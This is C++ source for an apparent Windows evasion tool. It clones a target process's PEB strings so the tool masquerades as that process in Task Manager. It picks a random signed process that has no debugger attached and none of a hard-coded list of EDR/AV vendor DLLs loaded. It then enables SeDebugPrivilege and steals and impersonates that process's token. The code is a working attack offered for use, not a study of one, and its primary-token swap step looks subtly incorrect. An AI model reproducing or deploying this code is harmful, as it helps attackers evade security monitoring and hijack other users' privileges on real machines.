#include <windows.h>
#include <TlHelp32.h>       // CreateToolhelp32Snapshot, Process32First/Next
#include <winternl.h>       // PEB, RTL_USER_PROCESS_PARAMETERS, NtQueryInformationProcess
#include <stdio.h>
#include <string>
#include <vector>
#include <algorithm>   // std::shuffle
#include <random>      // std::mt19937, std::random_device
#include <stdexcept>
#include <softpub.h>   // WINTRUST_ACTION_GENERIC_VERIFY_V2, WTD_* constants
#include <wintrust.h>  // WinVerifyTrust, WINTRUST_FILE_INFO
#pragma comment(lib, "wintrust.lib")

// ─────────────────────────────────────────────────────────────────────────────
// NtQueryInformationProcess — import dynamically so we don't need a .lib
// ─────────────────────────────────────────────────────────────────────────────

typedef NTSTATUS(NTAPI* pfnNtQueryInformationProcess)(
    HANDLE           ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID            ProcessInformation,
    ULONG            ProcessInformationLength,
    PULONG           ReturnLength);

static pfnNtQueryInformationProcess g_NtQIP = nullptr;

static bool InitNtdll()
{
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return false;
    g_NtQIP = reinterpret_cast<pfnNtQueryInformationProcess>(
        GetProcAddress(hNtdll, "NtQueryInformationProcess"));
    return g_NtQIP != nullptr;
}

// ─────────────────────────────────────────────────────────────────────────────
// Step 1 — find a process by name, return its PID (first match)
// ─────────────────────────────────────────────────────────────────────────────

static DWORD FindProcessByName(const wchar_t* name)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;

    if (Process32FirstW(snap, &pe))
    {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0)
            {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }

    CloseHandle(snap);
    return pid;
}

// ─────────────────────────────────────────────────────────────────────────────
// Step 2 — read a UNICODE_STRING buffer from a remote process into a wstring
// ─────────────────────────────────────────────────────────────────────────────

static std::wstring ReadRemoteUnicodeString(HANDLE hProc, const UNICODE_STRING& remoteUs)
{
    if (remoteUs.Length == 0 || !remoteUs.Buffer)
        return {};

    std::wstring result(remoteUs.Length / sizeof(WCHAR), L'\0');
    SIZE_T read = 0;
    if (!ReadProcessMemory(hProc, remoteUs.Buffer, result.data(),
                           remoteUs.Length, &read))
        return {};

    result.resize(read / sizeof(WCHAR));
    return result;
}

// ─────────────────────────────────────────────────────────────────────────────
// Step 3 — pull PEB strings out of a remote process
// ─────────────────────────────────────────────────────────────────────────────

struct ProcessStrings
{
    std::wstring commandLine;
    std::wstring imagePathName;
    std::wstring windowTitle;   // from EnumWindows, may be empty
};

static bool ReadRemoteProcessStrings(DWORD pid, ProcessStrings& out)
{
    HANDLE hProc = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProc)
    {
        printf("[-] OpenProcess(%lu) failed: %lu\n", pid, GetLastError());
        return false;
    }

    // ── Get PEB base address via NtQueryInformationProcess ───────────────────
    PROCESS_BASIC_INFORMATION pbi = {};
    NTSTATUS status = g_NtQIP(
        hProc, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);

    if (status != 0)
    {
        printf("[-] NtQueryInformationProcess failed: 0x%08lX\n", status);
        CloseHandle(hProc);
        return false;
    }

    // ── Read PEB ─────────────────────────────────────────────────────────────
    PEB remotePeb = {};
    SIZE_T bytesRead = 0;
    if (!ReadProcessMemory(hProc, pbi.PebBaseAddress,
                           &remotePeb, sizeof(remotePeb), &bytesRead))
    {
        printf("[-] ReadProcessMemory(PEB) failed: %lu\n", GetLastError());
        CloseHandle(hProc);
        return false;
    }

    // ── Read RTL_USER_PROCESS_PARAMETERS ─────────────────────────────────────
    RTL_USER_PROCESS_PARAMETERS remoteParams = {};
    if (!ReadProcessMemory(hProc, remotePeb.ProcessParameters,
                           &remoteParams, sizeof(remoteParams), &bytesRead))
    {
        printf("[-] ReadProcessMemory(ProcessParameters) failed: %lu\n",
               GetLastError());
        CloseHandle(hProc);
        return false;
    }

    // ── Read the actual string data ───────────────────────────────────────────
    out.commandLine    = ReadRemoteUnicodeString(hProc, remoteParams.CommandLine);
    out.imagePathName  = ReadRemoteUnicodeString(hProc, remoteParams.ImagePathName);

    CloseHandle(hProc);

    // ── Try to grab a window title from the target process ───────────────────
    // We use EnumWindows + GetWindowThreadProcessId to find a visible window.
    struct EnumCtx { DWORD pid; std::wstring title; } ctx = { pid };

    EnumWindows([](HWND hwnd, LPARAM lp) -> BOOL
    {
        auto* c = reinterpret_cast<EnumCtx*>(lp);
        DWORD wPid = 0;
        GetWindowThreadProcessId(hwnd, &wPid);
        if (wPid == c->pid && IsWindowVisible(hwnd))
        {
            wchar_t buf[512] = {};
            GetWindowTextW(hwnd, buf, 512);
            if (buf[0])
            {
                c->title = buf;
                return FALSE; // stop
            }
        }
        return TRUE;
    }, reinterpret_cast<LPARAM>(&ctx));

    out.windowTitle = ctx.title;
    return true;
}

// ─────────────────────────────────────────────────────────────────────────────
// Signed-process scanner
//   Returns every running process whose on-disk image has a valid Authenticode
//   chain (WinVerifyTrust succeeds).  Requires wintrust.lib (linked above).
// ─────────────────────────────────────────────────────────────────────────────

struct SignedProcessInfo
{
    DWORD        pid;
    std::wstring exeName;    // e.g. L"lsass.exe"
    std::wstring imagePath;  // full path to the on-disk binary
};

// Returns TRUST_E_NOSIGNATURE, ERROR_SUCCESS, or another WinVerifyTrust code.
static LONG VerifyFileSignature(const std::wstring& path)
{
    WINTRUST_FILE_INFO fileInfo = {};
    fileInfo.cbStruct           = sizeof(fileInfo);
    fileInfo.pcwszFilePath      = path.c_str();

    GUID action = WINTRUST_ACTION_GENERIC_VERIFY_V2;

    WINTRUST_DATA wvd    = {};
    wvd.cbStruct         = sizeof(wvd);
    wvd.dwUIChoice       = WTD_UI_NONE;
    wvd.fdwRevocationChecks = WTD_REVOKE_NONE;  // skip online revocation
    wvd.dwUnionChoice    = WTD_CHOICE_FILE;
    wvd.pFile            = &fileInfo;
    wvd.dwStateAction    = WTD_STATEACTION_VERIFY;

    LONG result = WinVerifyTrust(NULL, &action, &wvd);

    // Always close the state handle.
    wvd.dwStateAction = WTD_STATEACTION_CLOSE;
    WinVerifyTrust(NULL, &action, &wvd);

    return result;
}

// Resolves a PID to its full image path using QueryFullProcessImageNameW.
static std::wstring GetProcessImagePath(DWORD pid)
{
    HANDLE hProc = OpenProcess(
        PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) return {};

    wchar_t buf[MAX_PATH] = {};
    DWORD   len = MAX_PATH;
    if (!QueryFullProcessImageNameW(hProc, 0, buf, &len))
    {
        CloseHandle(hProc);
        return {};
    }
    CloseHandle(hProc);
    return std::wstring(buf, len);
}

// ─────────────────────────────────────────────────────────────────────────────
// Filtering helpers for PickRandomSignedProcess
// ─────────────────────────────────────────────────────────────────────────────

// Returns true if the process runs in Session 0 (system/kernel services).
static bool IsSessionZeroProcess(DWORD pid)
{
    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) return true; // can't open → assume system, skip

    DWORD sessionId = 0;
    bool result = !ProcessIdToSessionId(pid, &sessionId) || sessionId == 0;
    CloseHandle(hProc);
    return result;
}

// Returns true if a debugger is attached to the process.
static bool IsBeingDebugged(DWORD pid)
{
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) return true; // can't query → treat as monitored

    BOOL debugged = FALSE;
    CheckRemoteDebuggerPresent(hProc, &debugged);
    CloseHandle(hProc);
    return debugged == TRUE;
}

// Returns true if the process has known EDR/AV DLLs loaded in its module list.
static bool HasMonitoringDlls(DWORD pid)
{
    static const wchar_t* kSuspectLibs[] = {
        L"csfalcon",     // CrowdStrike
        L"SentinelOne",
        L"mbae",         // Malwarebytes
        L"aswhook",      // Avast
        L"snxhk",        // Avast
        L"hmpalert",     // HitmanPro.Alert
        L"cylance",
        L"CarbonBlack",
        L"cbhook",
        L"mfehook",      // McAfee
        L"sophos",
    };

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (snap == INVALID_HANDLE_VALUE) return false;

    MODULEENTRY32W me = { sizeof(me) };
    bool found = false;

    if (Module32FirstW(snap, &me))
    {
        do {
            for (const auto* lib : kSuspectLibs)
            {
                if (wcsstr(me.szModule, lib) || wcsstr(me.szExePath, lib))
                {
                    found = true;
                    break;
                }
            }
        } while (!found && Module32NextW(snap, &me));
    }

    CloseHandle(snap);
    return found;
}

// Returns the thread count for a given PID from a process snapshot.
static DWORD GetThreadCount(DWORD pid)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD count = 0;

    if (Process32FirstW(snap, &pe))
        do {
            if (pe.th32ProcessID == pid) { count = pe.cntThreads; break; }
        } while (Process32NextW(snap, &pe));

    CloseHandle(snap);
    return count;
}

// Helper for PickRandomSignedProcess – must be at file scope so it can be
// used as a std::vector<> template argument (local types are not allowed).
struct ProcessSnapshotEntry { DWORD pid; wchar_t exeName[MAX_PATH]; };

// Enumerate all processes and pick one random signed process.
// Strategy: snapshot all PIDs (O(n), instant), shuffle, then verify
// one-by-one and stop at the first hit — so we do at most `maxAttempts`
// WinVerifyTrust calls regardless of the total process count.
//
// Returns a SignedProcessInfo with pid == 0 if none found.
static SignedProcessInfo PickRandomSignedProcess(DWORD maxAttempts = 48)
{
    // ── 1. Collect every (pid, exeName) from the snapshot ────────────────────
    std::vector<ProcessSnapshotEntry> entries;
    entries.reserve(256);

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
    {
        printf("[-] PickRandomSignedProcess: snapshot failed (%lu)\n", GetLastError());
        return {};
    }

    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe))
    {
        do {
            if (pe.th32ProcessID == 0) continue;
            ProcessSnapshotEntry e;
            e.pid = pe.th32ProcessID;
            wcsncpy_s(e.exeName, pe.szExeFile, _TRUNCATE);
            entries.push_back(e);
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);

    // ── 2. Shuffle — hardware-seeded Mersenne Twister ─────────────────────────
    std::mt19937 rng(std::random_device{}());
    std::shuffle(entries.begin(), entries.end(), rng);

    // ── 3. Filter one-by-one; stop at first signed+unmonitored hit ──────────
    DWORD attempts = 0;
    for (const auto& e : entries)
    {
        if (attempts++ >= maxAttempts) break;

        // Skip PID 0 (Idle) and PID 4 (System)
        if (e.pid <= 4) continue;

        // Skip Session 0 processes (system services, kernel workers)
        if (IsSessionZeroProcess(e.pid)) continue;

        // Skip processes under a debugger
        if (IsBeingDebugged(e.pid)) continue;

        // Skip thread-heavy processes (likely bloated security tools)
        if (GetThreadCount(e.pid) > 80) continue;

        // Resolve full image path — required for signature check
        std::wstring path = GetProcessImagePath(e.pid);
        if (path.empty()) continue;

        // Must be Authenticode-signed
        if (VerifyFileSignature(path) != ERROR_SUCCESS) continue;

        // Must not have EDR/AV DLLs loaded in its module list
        if (HasMonitoringDlls(e.pid)) continue;

        // ✓ Signed + unmonitored
        SignedProcessInfo result;
        result.pid       = e.pid;
        result.exeName   = e.exeName;
        result.imagePath = path;
        printf("[+] Selected signed + unmonitored process: PID %-6lu %ws\n",
               result.pid, result.exeName.c_str());
        return result;
    }

    printf("[-] No signed process found within %lu attempts.\n", maxAttempts);
    return {}; // pid == 0 signals failure
}

// ─────────────────────────────────────────────────────────────────────────────
// Token stealing — duplicate the primary token of a remote process and
// impersonate it (or assign it) on the current process/thread.
// ─────────────────────────────────────────────────────────────────────────────

// Enable SeDebugPrivilege on the current process token so we can open
// processes we don't own.  Call once at startup before any OpenProcess.
static bool EnableSeDebugPrivilege()
{
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        printf("[-] OpenProcessToken (self) failed: %lu\n", GetLastError());
        return false;
    }

    LUID luid = {};
    if (!LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid))
    {
        printf("[-] LookupPrivilegeValue(SeDebugPrivilege) failed: %lu\n",
               GetLastError());
        CloseHandle(hToken);
        return false;
    }

    TOKEN_PRIVILEGES tp        = {};
    tp.PrivilegeCount          = 1;
    tp.Privileges[0].Luid      = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD err = GetLastError();
    CloseHandle(hToken);

    if (!ok || err == ERROR_NOT_ALL_ASSIGNED)
    {
        printf("[-] AdjustTokenPrivileges failed: %lu\n", err);
        return false;
    }

    printf("[+] SeDebugPrivilege enabled.\n");
    return true;
}

// Duplicate the primary token from `sourcePid` and impersonate it on the
// current thread.  Optionally assigns it to the process token instead
// (requires SeAssignPrimaryTokenPrivilege — usually needs SYSTEM).
//
//   impersonateOnly = true  →  ImpersonateLoggedOnUser  (thread-level, easier)
//   impersonateOnly = false →  SetThreadToken + attempt process-token swap
//
// Returns the duplicated token handle on success (caller must CloseHandle),
// or NULL on failure.
static HANDLE StealProcessToken(DWORD sourcePid, bool impersonateOnly = true)
{
    // ── 1. Open the source process ───────────────────────────────────────────
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, sourcePid);
    if (!hProc)
    {
        printf("[-] StealProcessToken: OpenProcess(%lu) failed: %lu\n",
               sourcePid, GetLastError());
        return NULL;
    }

    // ── 2. Open its primary token ────────────────────────────────────────────
    HANDLE hSrcToken = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hSrcToken))
    {
        printf("[-] OpenProcessToken(%lu) failed: %lu\n",
               sourcePid, GetLastError());
        CloseHandle(hProc);
        return NULL;
    }
    CloseHandle(hProc);

    // ── 3. Print token user for diagnostic purposes ──────────────────────────
    DWORD needed = 0;
    GetTokenInformation(hSrcToken, TokenUser, NULL, 0, &needed);
    if (needed)
    {
        std::vector<BYTE> buf(needed);
        if (GetTokenInformation(hSrcToken, TokenUser, buf.data(), needed, &needed))
        {
            auto* tu = reinterpret_cast<TOKEN_USER*>(buf.data());
            wchar_t name[256] = {}, domain[256] = {};
            DWORD nLen = 256, dLen = 256;
            SID_NAME_USE use;
            if (LookupAccountSidW(NULL, tu->User.Sid, name, &nLen, domain, &dLen, &use))
                printf("[*] Source token user: %ws\\%ws\n", domain, name);
        }
    }

    // ── 4. Duplicate as an impersonation token ───────────────────────────────
    HANDLE hDup = NULL;
    if (!DuplicateTokenEx(hSrcToken,
                          TOKEN_ALL_ACCESS,
                          NULL,
                          SecurityImpersonation,
                          TokenImpersonation,
                          &hDup))
    {
        printf("[-] DuplicateTokenEx failed: %lu\n", GetLastError());
        CloseHandle(hSrcToken);
        return NULL;
    }
    CloseHandle(hSrcToken);

    // ── 5. Impersonate on the current thread ─────────────────────────────────
    if (!ImpersonateLoggedOnUser(hDup))
    {
        printf("[-] ImpersonateLoggedOnUser failed: %lu\n", GetLastError());
        CloseHandle(hDup);
        return NULL;
    }

    printf("[+] Token stolen from PID %lu — thread is now impersonating.\n",
           sourcePid);

    // ── 6. Optionally try to swap the process primary token ─────────────────
    //      This requires SeAssignPrimaryTokenPrivilege (typically SYSTEM only).
    if (!impersonateOnly)
    {
        HANDLE hPrimary = NULL;
        if (DuplicateTokenEx(hDup,
                             TOKEN_ALL_ACCESS,
                             NULL,
                             SecurityImpersonation,
                             TokenPrimary,
                             &hPrimary))
        {
            // Re-open our own process token for replacement
            HANDLE hSelf = NULL;
            if (OpenProcessToken(GetCurrentProcess(),
                                 TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_DEFAULT |
                                 TOKEN_ADJUST_SESSIONID | TOKEN_QUERY,
                                 &hSelf))
            {
                // SetTokenInformation can swap the primary token on Vista+
                if (SetTokenInformation(hSelf, TokenLinkedToken,
                                        &hPrimary, sizeof(HANDLE)))
                    printf("[+] Process primary token replaced.\n");
                else
                    printf("[~] SetTokenInformation (primary swap) failed: %lu"
                           " — thread impersonation is still active.\n",
                           GetLastError());
                CloseHandle(hSelf);
            }
            CloseHandle(hPrimary);
        }
    }

    return hDup; // caller owns this handle
}

// ─────────────────────────────────────────────────────────────────────────────
// Step 4 — write a string into our own PEB UNICODE_STRING
//           Allocates a fresh heap buffer if the current one is too small.
// ─────────────────────────────────────────────────────────────────────────────

static void ApplyUnicodeString(UNICODE_STRING* us, const std::wstring& value)
{
    if (value.empty()) return;

    const USHORT needed = static_cast<USHORT>(value.size() * sizeof(WCHAR));

    if (us->MaximumLength >= needed + sizeof(WCHAR))
    {
        // Fits in the existing buffer — just overwrite.
        SecureZeroMemory(us->Buffer, us->MaximumLength);
        memcpy(us->Buffer, value.c_str(), needed);
        us->Length = needed;
    }
    else
    {
        // Allocate a new buffer (no null terminator needed by UNICODE_STRING,
        // but we add one so legacy code that casts Buffer to LPWSTR still works).
        const USHORT newMax = static_cast<USHORT>(needed + sizeof(WCHAR));
        WCHAR* newBuf = static_cast<WCHAR*>(
            HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, newMax));

        if (!newBuf)
        {
            printf("[-] HeapAlloc failed for UNICODE_STRING replacement.\n");
            return;
        }

        memcpy(newBuf, value.c_str(), needed);
        us->Buffer        = newBuf;
        us->Length        = needed;
        us->MaximumLength = newMax;
        // Note: we intentionally leak the old buffer — it's owned by the loader
        // and freeing it is unsafe. The process will exit anyway.
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Step 5 — apply cloned strings to our own process
// ─────────────────────────────────────────────────────────────────────────────

// sourcePid — the PID we selected (used for token theft).
// Pass 0 to skip token theft (PEB-only clone).
static void ApplyToCurrentProcess(const ProcessStrings& src, DWORD sourcePid = 0)
{
    PEB* peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    RTL_USER_PROCESS_PARAMETERS* params = peb->ProcessParameters;

    printf("[*] Applying cloned info to current process (PID %lu)...\n\n",
           GetCurrentProcessId());

    // CommandLine
    printf("    CommandLine   : %ws\n", src.commandLine.c_str());
    ApplyUnicodeString(&params->CommandLine, src.commandLine);

    // ImagePathName
    printf("    ImagePathName : %ws\n", src.imagePathName.c_str());
    ApplyUnicodeString(&params->ImagePathName, src.imagePathName);

    // Console title
    if (!src.windowTitle.empty())
    {
        printf("    WindowTitle   : %ws\n", src.windowTitle.c_str());
        SetConsoleTitleW(src.windowTitle.c_str());
    }
    else if (!src.imagePathName.empty())
    {
        // Fall back to the exe name as the title.
        const wchar_t* slash = wcsrchr(src.imagePathName.c_str(), L'\\');
        SetConsoleTitleW(slash ? slash + 1 : src.imagePathName.c_str());
    }

    printf("\n[+] PEB clone done. This process now looks like the target in Task Manager.\n");

    // ── Token theft ──────────────────────────────────────────────────────────
    if (sourcePid != 0)
    {
        printf("\n[*] Attempting token theft from PID %lu...\n", sourcePid);

        // SeDebugPrivilege is required to open most processes.
        EnableSeDebugPrivilege();

        HANDLE hToken = StealProcessToken(sourcePid, /*impersonateOnly=*/true);
        if (hToken)
        {
            // hToken stays open — closing it would revert impersonation.
            // Store it globally or keep it alive for the process lifetime.
            // To revert at any point: RevertToSelf(); CloseHandle(hToken);
            printf("[+] Token impersonation active. Current thread runs as target user.\n");
        }
        else
        {
            printf("[-] Token theft failed — continuing with original token.\n");
        }
    }
}
